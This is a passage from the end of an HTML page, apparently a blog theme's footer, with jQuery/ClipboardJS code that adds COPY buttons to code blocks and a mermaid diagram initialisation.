    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>